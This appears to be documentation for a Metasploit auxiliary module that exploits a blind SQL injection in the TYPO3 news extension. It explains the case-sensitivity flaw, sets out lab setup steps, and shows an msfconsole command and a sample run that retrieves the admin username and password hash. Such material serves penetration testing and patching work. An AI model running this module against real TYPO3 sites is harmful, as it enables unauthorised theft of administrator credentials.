## Description

News module extensions v5.3.2 and earlier for TYPO3 contain an SQL injection vulnerability. This module allows an unauthenticated user to exploit the SQL injection vulnerability by generating requests to retrieve the password hash for the admin user of the application. This module has been tested on TYPO3 3.16.0 running news extension 5.0.0.

## Vulnerable Application

In vulnerable versions of the news module for TYPO3, a filter for unsetting user specified values does not account for capitalization of the paramter name. This allows a user to inject values to an SQL query.

To exploit the vulnerability, the module generates requests and sets a value for `order` and `OrderByAllowed`, which gets passed to the SQL query. The requests are constructed to reorder the display of news articles based on a character matching. This allows a blind SQL injection to be performed to retrieve a username and password hash.

## Options

**PATTERN1** and **PATTERN2**

These patterns are used to determine whether the news articles have been reordered. By default, the module will search for headlines and set the first identified headline to PATTERN1 and the second to PATTERN2.

**ID**

The value for query parameter `id` of the page that the news extension is running on.

## Verification Steps

- [ ] Install [Typo3 VM](https://www.turnkeylinux.org/download?file=turnkey-typo3-14.1-jessie-amd64.ova)
- [ ] Launch the VM and configure it
- [ ] SSH to the VM
- [ ]  `cd /var/www/typo3/ && composer require georgringer/news:5.0.0`
- [ ] Login to the web interface
- [ ] Enable the news extension
- [ ] Import [vulnerable page](https://github.com/rapid7/metasploit-framework/files/1015777/T3D__2017-05-20_02-17-z.t3d.zip)
- [ ] Enable page
- [ ] Verify if page is visble to unauthenticated user and note the id
- [ ] `./msfconsole -q -x 'use auxiliary/admin/http/typo3_news_module_sqli; set rhost <rhost>; set id <id>; run'`
- [ ] Username and password hash should have been retrieved

## Scenarios

### News Module 5.0.0 on TYPO3 3.16.0

```
msfdev@simulator:~/git/metasploit-framework$ ./msfconsole -q -x 'use auxiliary/admin/http/typo3_news_module_sqli; set rhost 172.22.222.136; set id 37; run'
rhost => 172.22.222.136
id => 37
[*] Trying to automatically determine Pattern1 and Pattern2...
[*] Pattern1: Article #1, Pattern2: Article #2
[+] Username: admin
[+] Password Hash: $P$Ch4lme3.gje9o.DjMip59baG7b/mIp.
[*] Auxiliary module execution completed
msf5 auxiliary(admin/http/typo3_news_module_sqli) > 
```
